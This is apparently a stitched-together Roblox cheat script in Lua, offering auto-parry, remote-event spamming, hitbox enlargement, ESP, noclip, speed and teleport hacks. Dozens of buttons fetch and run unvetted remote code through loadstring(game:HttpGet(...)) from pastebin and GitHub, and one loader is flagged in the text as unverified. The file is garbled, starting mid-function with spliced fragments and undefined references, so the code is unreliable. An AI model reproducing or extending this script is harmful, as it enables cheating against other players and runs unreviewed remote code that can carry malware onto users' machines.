    local OldPosition = Ball.Position
    local OldTick = tick()
    Ball:GetPropertyChangedSignal("Position"):Connect(function()
        if IsTarget() then -- No need to do the math if we're not being attacked.
            local Distance = (Ball.Position - workspace.CurrentCamera.Focus.Position).Magnitude
            local Velocity = (OldPosition - Ball.Position).Magnitude -- Fix for .Velocity not working. Yes I got the lowest possible grade in accuplacer math.
            print(`Distance: {Distance}\nVelocity: {Velocity}\nTime: {Distance / Velocity}`)
            if (Distance / Velocity) <= 10 then -- Sorry for the magic number. This just works. No, you don't get a slider for this because it's 2am.
                Parry()
            end
        end
        if (tick() - OldTick >= 1/60) then -- Don't want it to update too quickly because my velocity implementation is aids. Yes, I tried Ball.Velocity. No, it didn't work.
            OldTick = tick()
            OldPosition = Ball.Position
        end
    end)
end)
end

function SwordCrateManual()
game:GetService("ReplicatedStorage").Remote.RemoteFunction:InvokeServer("PromptPurchaseCrate", workspace.Spawn.Crates.NormalSwordCrate)
end

function ExplosionCrateManual()
game:GetService("ReplicatedStorage").Remote.RemoteFunction:InvokeServer("PromptPurchaseCrate", workspace.Spawn.Crates.NormalExplosionCrate)
end

function SwordCrateAuto()
while _G.AutoSword do
game:GetService("ReplicatedStorage").Remote.RemoteFunction:InvokeServer("PromptPurchaseCrate", workspace.Spawn.Crates.NormalSwordCrate)
wait(1)
end
end

function ExplosionCrateAuto()
while _G.AutoBoom do
game:GetService("ReplicatedStorage").Remote.RemoteFunction:InvokeServer("PromptPurchaseCrate", workspace.Spawn.Crates.NormalExplosionCrate)
wait(1)
end
end

--start
do
    Fluent:Notify({
        Title = "Exploit X Hub has injected",
        Content = "report any bugs at https://dsc.gg/exploitx",
        SubContent = "or copy the link trough the 'Misc' page", -- Optional
        Duration = 3.5 -- Set to nil to make the notification not disappear
    })
end

do
    Fluent:Notify({
        Title = "Exploit X Hub has injected",
        Content = "Made by Fsploit ",
        SubContent = "or copy the link trough the 'Misc' page", -- Optional
        Duration = 3.5 -- Set to nil to make the notification not disappear
    })
end

do
    Fluent:Notify({
        Title = "Exploit X Hub has injected",
        Content = "version 2.9.1",
        SubContent = "or copy the link trough the 'Misc' page", -- Optional
        Duration = 3.5 -- Set to nil to make the notification not disappear
    })
end

--start, the real one
local Mainy = Tabs.Main:AddSection("Parry")

local Toggle = Mainy:AddToggle("Parry", {Title = "Toggle Auto Parry", Default = false })
Toggle:OnChanged(function(Value)
        getgenv().Parry = Value
        while getgenv().Parry do
        autoParry()
        wait(0.3)
        end
end)

Mainy:AddButton({
        Title = "Manual Spam Parry GUI",
        Description = "with a toggle that will be easier to turn on/off during combat",
        Callback = function()
            Manual()
        end
    })
    
local Toggle = Mainy:AddToggle("Hold F/M2", {Title = "Hold Parry button for spam", Default = false })
Toggle:OnChanged(function(Value)
  getgenv().exeSpam = Value
     if getgenv().exeSpam then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Spam",true))()
        end
end)

local Toggle = Mainy:AddToggle("Freeze Spammy", {Title = "Freeze Ability Spammer", Default = false })
Toggle:OnChanged(function(Value)
  local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local sus = Value

local function Freezer()
    if sus then
        print("Freeze Spammer is enabled | Exploit X")
        while sus do
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Freeze"):FireServer()
            wait()
        end
    else
        print("Freeze Spammer is disabled | Exploit X")
    end
end

game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.B then
        Freezer()
    end
end)
end)

local Money = Tabs.Main:AddSection("Features")

Money:AddButton({
        Title = "Open Sword Crate",
        Description = "will open one common sword crate",
        Callback = function()
            SwordCrateManual()
        end
    })
    
Money:AddButton({
        Title = "Open Explosion Crate",
        Description = "will open one common explosion crate",
        Callback = function()
            ExplosionCrateManual()
        end
    })
    
local Toggle = Money:AddToggle("SwordAuto", {Title = "Auto Open Sword Crate", Default = false })
Toggle:OnChanged(function(Value)
_G.AutoSword = Value
        SwordCrateAuto()
end)

local Toggle = Money:AddToggle("ExplosionAuto", {Title = "Auto Open Explosion Crate", Default = false })
Toggle:OnChanged(function(Value)
_G.AutoBoom = Value
        ExplosionCrateAuto()
end)

--misc
local Misc = Tabs.Misc:AddSection("Misc")

Misc:AddButton({
        Title = "Mobile Keyboard",
        Description = "launches a GUI that mimics a Keyboard.",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
        end
    })
    
Misc:AddButton({
        Title = "Infinite Yield",
        Description = "I dont think i have to explain what this is.",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
        end
    })

--credits
local Credits = Tabs.Credits:AddSection("Credits")

Credits:AddParagraph({
        Title = "Credits",
        Content = "Script was made by Exploit X Development TeamÃ‚Â©.\nAll Rights Reserved"
    })

Credits:AddButton({
        Title = "Copy youtube Link",
        Description = "https://m.youtube.com/channel/UCV1CTzkwO46A70taai-rFyQ",
        Callback = function()
            setclipboard("https://m.youtube.com/channel/UCV1CTzkwO46A70taai-rFyQ")
        end
    })

Credits:AddButton({
        Title = "Copy Discord Link",
        Description = "https://dsc.gg/exploitx",
        Callback = function()
            setclipboard("https://dsc.gg/exploitx")
        end
    })
    
local Showcase = Tabs.Credits:AddSection("Awesome Showcasers")

Showcase:AddParagraph({
        Title = "None :(",
        Content = "no awesome showcasers yet *womp womp*"
    })
    
    print("Exploit X Hub  | Propriety of exploit x Development TeamÃ‚Â©")
      		print("button pressed")
  	end    
})

Tab:AddButton({
	Name = "Bedol Hub",
	Callback = function()
	  --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
_G.UI_Size = 200 -- config ui size
loadstring(game:HttpGet("https://raw.githubusercontent.com/3345-c-a-t-s-u-s/-beta-/main/AutoParry.lua"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "Galaxy Hub V2",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/fruEwHqY"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]] 



Tab:AddButton({
	Name = "Manual Spam Credit ( 0x92 )",
	Callback = function()
           loadstring(game:HttpGet("https://raw.githubusercontent.com/TwilightLoader/TwilightsPublic/main/Twilights.lua"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Auto Parry",
	Callback = function()
           loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/main/MC%3ABlade%20Ball%20Parry",true))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Zygarde Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/louismich4el/Zygarde/main/Protected%20zygarde.lua"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Auto Clash!",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/t2391h1A"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Fps Boost!",
	Callback = function()
      		_G.Settings = {
    Players = {
        ["Ignore Me"] = true, -- Ignore your Character
        ["Ignore Others"] = true-- Ignore other Characters
    },
    Meshes = {
        Destroy = false, -- Destroy Meshes
        LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
    },
    Images = {
        Invisible = true, -- Invisible Images
        LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
        Destroy = false, -- Destroy Images
    },
    ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
    ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
    ["No Explosions"] = true, -- Makes Explosion's invisible
    ["No Clothes"] = true, -- Removes Clothing from the game
    ["Low Water Graphics"] = true, -- Removes Water Quality
    ["No Shadows"] = true, -- Remove Shadows
    ["Low Rendering"] = true, -- Lower Rendering
    ["Low Quality Parts"] = true -- Lower quality parts
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Auto Spam",
	Callback = function()
      		loadstring(game:HttpGet("https://pastebin.com/raw/t2391h1A"))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Auto Detect Spam",
	Callback = function()
      		loadstring(game:HttpGet(('https://pastebin.com/raw/HPNBFGSf'),true))()
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



local Tab = Window:MakeTab({
	Name = "Universal",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]



Tab:AddButton({
	Name = "Top X V2",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Top-X-V2/main/Top%20X%20V2%20By%20GearV4"))();
      		print("button pressed")
  	end    
})

Tab:AddButton({
	Name = "LoLix Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Lolix-Hub/main/Lolix.lua"))();
      		print("button pressed")
  	end    
})

Tab:AddButton({
	Name = "Skidded Gui v1 PE",
	Callback = function()
	  loadstring(game:HttpGet("https://pastebin.com/raw/mPwiWSgM"))();
      		print("button pressed")
  	end    
})

Tab:AddButton({
	Name = "GHOST HUB",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
      		print("button pressed")
  	end    
})

Tab:AddButton({
	Name = "Alysse Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/NathTheDev/AlysseAndroid/main/loader.lua"))()
      		print("button pressed")
  	end    
})

Tab:AddButton({
	Name = "Sam-hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Sam-Hub/main/Sam-Hub"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]


Tab:AddButton({
	Name = "Alsploit Hub V1",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/XLSPloit-V2.lua/main/Obfuscate"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Major Hub 1.5",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Major-Hub-v1.5/main/Major%20Hub", true))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Fly Gui Modded",
	Callback = function()
	  loadstring(game:HttpGet("https://pastefy.app/M0N30XXG/raw"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Gear Hub V7",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Gear-Hub-V7/main/Gear%20hub%20v7"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Simple Hub x Gear SSX",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Simple-Hub-X-Gear-SSX.lua/main/Gear%20SSX%20X%20Simple%20Hub"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Legends Hub V2",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Legends-Hub-V2/main/Legends%20Hub%20V2"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Shadow Hub V2",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/GearV4/Shadow-Hub-Key-Fixed/main/Shadow%20Hub%20V2%20Key%20Fixed"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Project Smash",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraScript/Script/main/ProjectSmash'))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Pink EXE",
	Callback = function()
	  loadstring(game:HttpGet("https://pastefy.app/6fXR5mAT/raw"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "R3TH HUB V4",
	Callback = function()
	  loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Pie X v0.3",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/OfficialDex/-hub-x-ig-test-0.3/main/Pie%20x%20hub%20test%200.3%20ig"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Meow Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/VikiChardd/Bb-script/main/Meow%20Source%20Hub"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Sorix Hub",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/JunBloxYTPlayz/SORIX-Hub/main/SORIX%20Hub%20Mm2"))();
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "Scriptonite Beta X",
	Callback = function()
	  loadstring(game:HttpGet("https://raw.githubusercontent.com/EpicSwords1982/Scriptonite-Hub2/main/Scriptonite%20not%20loadstring"))()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]



Tab:AddButton({
	Name = "GearsTycoon V3",
	Callback = function()
	-- Here Your Toggle For Kavo Ui

--- You know what It's your lucky day skid enjoy my code :) ---

local kavoUi = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local window = kavoUi.CreateLib("GearTycoon V3 Hub","BloodTheme")

---Tabs

local Tab1 = window:NewTab("Main")
local Tab1Section = Tab1:NewSection("Main")
local Tab2 = window:NewTab("Tools")
local Tab2Section = Tab2:NewSection("Tools")
local Tab3 = window:NewTab("Credits")
local Tab3Section = Tab3:NewSection("Made By GearV4")
local Tab3Section = Tab3:NewSection("This Script is inspired by Jn Hh So Sub To Him")

---Buttons

Tab1Section:NewButton("Hitbox","Increase Range",function()
_G.HeadSize = 25
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)

Tab1Section:NewButton("Big Hitbox","Increase large Range",function()
_G.HeadSize = 50
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
end)

Tab1Section:NewToggle("Infinite Jumps"," Infinite Jumps",function()
local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
end)

Tab1Section:NewButton("Speed","Increase speed",function()
function isNumber(str)
  if tonumber(str) ~= nil or str == 'inf' then
    return true
  end
end
local tspeed = 1
local hb = game:GetService("RunService").Heartbeat
local tpwalking = true
local player = game:GetService("Players")
local lplr = player.LocalPlayer
local chr = lplr.Character
local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
while tpwalking and hb:Wait() and chr and hum and hum.Parent do
  if hum.MoveDirection.Magnitude > 0 then
    if tspeed and isNumber(tspeed) then
      chr:TranslateBy(hum.MoveDirection * tonumber(tspeed))
    else
      chr:TranslateBy(hum.MoveDirection)
    end
  end
end
end)

Tab1Section:NewButton("Esp Antena","location",function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function createBox()
    local box = Instance.new("BoxHandleAdornment")
    box.Size = Vector3.new(1,100, 1)
    box.Color3 = Color3.new(1,0,0)
    box.Transparency = 0.1
    box.ZIndex = 5
    return box
end

local function updateEsp(player, box)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        box.Visible = true
        box.Adornee = character.HumanoidRootPart
        box.Parent = character.HumanoidRootPart
    else
        box.Visible = false
        box.Adornee = nil
        box.Parent = nil
    end
end

local function onPlayerAdded(player)
    local box = createBox()
    updateEsp(player, box)
    player.CharacterAdded:Connect(function()
        updateEsp(player, box)
    end)
    player.CharacterRemoving:Connect(function()
        updateEsp(player, box)
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

Players.PlayerAdded:Connect(function(player)
    onPlayerAdded(player)
end)

RunService.RenderStepped:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        updateEsp(player)
    end
end)
end)

Tab1Section:NewButton("Esp","location",function()
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function createBox()
    local box = Instance.new("BoxHandleAdornment")
    box.Size = Vector3.new(5, 5, 2)
    box.Color3 = Color3.new(1,0,0)
    box.Transparency = 0.1
    box.ZIndex = 5
    return box
end

local function updateEsp(player, box)
    local character = player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        box.Visible = true
        box.Adornee = character.HumanoidRootPart
        box.Parent = character.HumanoidRootPart
    else
        box.Visible = false
        box.Adornee = nil
        box.Parent = nil
    end
end

local function onPlayerAdded(player)
    local box = createBox()
    updateEsp(player, box)
    player.CharacterAdded:Connect(function()
        updateEsp(player, box)
    end)
    player.CharacterRemoving:Connect(function()
        updateEsp(player, box)
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    onPlayerAdded(player)
end

Players.PlayerAdded:Connect(function(player)
    onPlayerAdded(player)
end)

RunService.RenderStepped:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        updateEsp(player)
    end
end)
end)

Tab1Section:NewButton("Ping Counter","Counts Ping",function()
loadstring(game:HttpGet("https://pastebin.com/raw/MvKKJ331",true))()
end)

Tab1Section:NewButton("Fps Counter","Counts Fps",function()
loadstring(game:HttpGet("https://pastebin.com/raw/ySHJdZpb",true))()
end)

Tab2Section:NewButton("No Clip Tool","Go throw walls",function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = ("Equip To Noclip")
tool.Activated:Connect(function()
game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
game.Players.LocalPlayer.Character.Humanoid.Health = math.huge
while true do
		game:GetService("RunService").Stepped:wait()
		game.Players.LocalPlayer.Character.Head.CanCollide = false
		game.Players.LocalPlayer.Character.Torso.CanCollide = false
end
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)

Tab2Section:NewButton("Speed Tool","fast",function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Click To Speed Up"
tool.Activated:connect(function()
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)

Tab2Section:NewButton("Click to Tp","Teleport",function()
mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "Equip to Click TP"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)

Tab1Section:NewButton("Fly Gui V4", "Just Click It", function()
  loadstring(game:HttpGet("https://pastebin.com/raw/p1FYf8ZV"))();
    print("Clicked")
end)

Tab1Section:NewButton("Noclip Gui", "Just click it", function()
  local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local Noclip = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local OnButton = Instance.new("TextButton")
local OffButton = Instance.new("TextButton")
local Plr = Players.LocalPlayer
local Clipon = false
local Dragging = false
local Offset = Vector2.new(0, 0)

Noclip.Name = "Noclip"
Noclip.Parent = CoreGui

Frame.Name = "Frame"
Frame.Parent = Noclip
Frame.BackgroundColor3 = Color3.fromRGB(29, 103, 127, 1) -- Naranja fuerte
Frame.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
Frame.BorderSizePixel = 2
Frame.Position = UDim2.new(0.5, -105, 0.5, -63) -- Centrado en la pantalla
Frame.Size = UDim2.new(0, 210, 0, 127)
Frame.Active = true
Frame.Draggable = true -- Hace que el marco sea arrastrable

Title.Name = "Title"
Title.Parent = Frame
Title.BackgroundColor3 = Color3.fromRGB(37, 150, 190) -- Naranja claro
Title.BorderSizePixel = 0
Title.Size = UDim2.new(1, 0, 0.3, 0)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip by GearV4"
Title.TextColor3 = Color3.new(0, 0, 0) -- Negro
Title.TextScaled = true
Title.TextSize = 26
Title.TextStrokeColor3 = Color3.new(1, 1, 1) -- Blanco
Title.TextStrokeTransparency = 0

OnButton.Name = "OnButton"
OnButton.Parent = Frame
OnButton.BackgroundColor3 = Color3.fromRGB(37, 150, 190) -- Naranja claro
OnButton.BorderSizePixel = 0
OnButton.Position = UDim2.new(0.15, 0, 0.45, 0) -- Alineado en el centro vertical
OnButton.Size = UDim2.new(0.35, 0, 0.4, 0)
OnButton.Font = Enum.Font.Highway
OnButton.FontSize = Enum.FontSize.Size18
OnButton.Text = "On"
OnButton.TextColor3 = Color3.new(0, 0, 0) -- Negro
OnButton.TextScaled = true
OnButton.TextSize = 18
OnButton.TextStrokeColor3 = Color3.new(1, 1, 1) -- Blanco
OnButton.TextStrokeTransparency = 0

OffButton.Name = "OffButton"
OffButton.Parent = Frame
OffButton.BackgroundColor3 = Color3.fromRGB(37, 150, 190) -- Naranja claro
OffButton.BorderSizePixel = 0
OffButton.Position = UDim2.new(0.5, 0, 0.45, 0) -- Alineado en el centro vertical
OffButton.Size = UDim2.new(0.35, 0, 0.4, 0)
OffButton.Font = Enum.Font.Highway
OffButton.FontSize = Enum.FontSize.Size18
OffButton.Text = "Off"
OffButton.TextColor3 = Color3.new(0, 0, 0) -- Negro
OffButton.TextScaled = true
OffButton.TextSize = 18
OffButton.TextStrokeColor3 = Color3.new(1, 1, 1) -- Blanco
OffButton.TextStrokeTransparency = 0

local function ToggleNoclip(enabled)
    Clipon = enabled
    if enabled then
        for a, b in pairs(Workspace:GetChildren()) do
            if b.Name == Plr.Name then
                for i, v in pairs(b:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = false
                    end
                end
            end
        end
    else
        for a, b in pairs(Workspace:GetChildren()) do
            if b.Name == Plr.Name then
                for i, v in pairs(b:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = true
                    end
                end
            end
        end
    end
end

OnButton.MouseButton1Click:Connect(function()
    ToggleNoclip(true)
end)

OffButton.MouseButton1Click:Connect(function()
    ToggleNoclip(false)
end)

Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging = true
        Offset = input.Position - Frame.Position
        Frame.CaptureFocus = true
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        if Dragging then
            Frame.Position = UDim2.new(0, input.Position.X - Offset.X, 0, input.Position.Y - Offset.Y)
        end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        Dragging = false
        Frame.CaptureFocus = false
    end
end)

ToggleNoclip(false) -- Noclip
    print("Clicked")
end)

Section:NewButton("Animation Fe", "Jusy Click it", function()
  -- Energize by illremember, fe animations
-- DO NOT COPY AND CLAIM AS OWN, if you are using some of the script for your own, credit is highly appreciated!
-- Thank you, and enjoy.
 
-- Objects
 
local Energize = Instance.new("ScreenGui") -- The actual GUI
local SideFrame = Instance.new("Frame") -- Visible when GUI is closed
local OpenGUI = Instance.new("TextButton") -- Part of SideFrame
local SideFrameTitle = Instance.new("TextLabel") -- Part of SideFrame
local MainFrame = Instance.new("Frame") -- All of the stuff on the main frame
local GuiBottomFrame = Instance.new("Frame") -- Part of Active Frame
local Credits = Instance.new("TextLabel") -- Credits to illremember, hello there
local ScrollingFrame = Instance.new("ScrollingFrame") -- The scrolling frame of animations
local CheckR = Instance.new("TextLabel") -- Check if R15 or R6
local ScrollingFrameR15 = Instance.new("ScrollingFrame") -- The scrolling frame of R15 animations
 
local CrazySlash = Instance.new("TextButton")--COMPLETE
local Open = Instance.new("TextButton")--COMPLETE
local R15Spinner = Instance.new("TextButton")--COMPLETE
local ArmsOut = Instance.new("TextButton")--COMPLETE
local FloatSlash = Instance.new("TextButton")--COMPLETE
local WeirdZombie = Instance.new("TextButton")--COMPLETE
local DownSlash = Instance.new("TextButton")--COMPLETE
local Pull = Instance.new("TextButton")--COMPLETE
local CircleArm = Instance.new("TextButton")--COMPLETE
local Bend = Instance.new("TextButton")--COMPLETE
local RotateSlash = Instance.new("TextButton")--COMPLETE
local FlingArms = Instance.new("TextButton")--COMPLETE
 
local FullSwing = Instance.new("TextButton")--COMPLETE
local GlitchLevitate = Instance.new("TextButton")--COMPLETE
local MoonDance = Instance.new("TextButton")--COMPLETE
local FullPunch = Instance.new("TextButton")--COMPLETE
local Crouch = Instance.new("TextButton")--COMPLETE
local SpinDance = Instance.new("TextButton")--COMPLETE
local FloorFaint = Instance.new("TextButton")--COMPLETE
local JumpingJacks = Instance.new("TextButton")--COMPLETE
local Spinner = Instance.new("TextButton")--COMPLETE
local MegaInsane = Instance.new("TextButton")--COMPLETE
local ArmDetach = Instance.new("TextButton")--COMPLETE
local WeirdMove = Instance.new("TextButton")--COMPLETE
local Faint = Instance.new("TextButton")--COMPLETE
local CloneIllusion = Instance.new("TextButton")--COMPLETE
local Levitate = Instance.new("TextButton")--COMPLETE
local DinoWalk = Instance.new("TextButton")--COMPLETE
local FloorCrawl = Instance.new("TextButton")--COMPLETE
local SwordSlam = Instance.new("TextButton")--COMPLETE
local LoopHead = Instance.new("TextButton")--COMPLETE
local HeroJump = Instance.new("TextButton")--COMPLETE
local Insane = Instance.new("TextButton")--COMPLETE
local FloatingHead = Instance.new("TextButton")--COMPLETE
local HeadThrow = Instance.new("TextButton")--COMPLETE
local MovingDance = Instance.new("TextButton")--COMPLETE
local SuperPunch = Instance.new("TextButton")--COMPLETE
local ArmTurbine = Instance.new("TextButton")--COMPLETE
local Dab = Instance.new("TextButton")--COMPLETE
local FloatSit = Instance.new("TextButton")--COMPLETE
local SuperFaint = Instance.new("TextButton")--COMPLETE
local BarrelRoll = Instance.new("TextButton")--COMPLETE
local Scared = Instance.new("TextButton")--COMPLETE
local InsaneArms = Instance.new("TextButton")--COMPLETE
local SwordSlice = Instance.new("TextButton")--COMPLETE
local SpinDance2 = Instance.new("TextButton")--COMPLETE
local BowDown = Instance.new("TextButton")--COMPLETE
local LoopSlam = Instance.new("TextButton")--COMPLETE
 
local GuiTopFrame = Instance.new("Frame") -- Top of the main frame
local CloseGUI = Instance.new("TextButton") -- To close the GUI
local Title = Instance.new("TextLabel") -- Actual title of GUI, Energize
 
-- Properties
 
Energize.Name = "Energize"
Energize.Parent = game.Players.LocalPlayer.PlayerGui
 
SideFrame.Name = "SideFrame"
SideFrame.Parent = Energize
SideFrame.Active = true
SideFrame.BackgroundColor3 = Color3.new(1, 0.329412, 0.329412)
SideFrame.Draggable = true
SideFrame.Position = UDim2.new(0, 376, 0, 125)
SideFrame.Size = UDim2.new(0, 460, 0, 32)
SideFrame.Visible = false
 
OpenGUI.Name = "OpenGUI"
OpenGUI.Parent = SideFrame
OpenGUI.BackgroundColor3 = Color3.new(1, 1, 1)
OpenGUI.BackgroundTransparency = 1
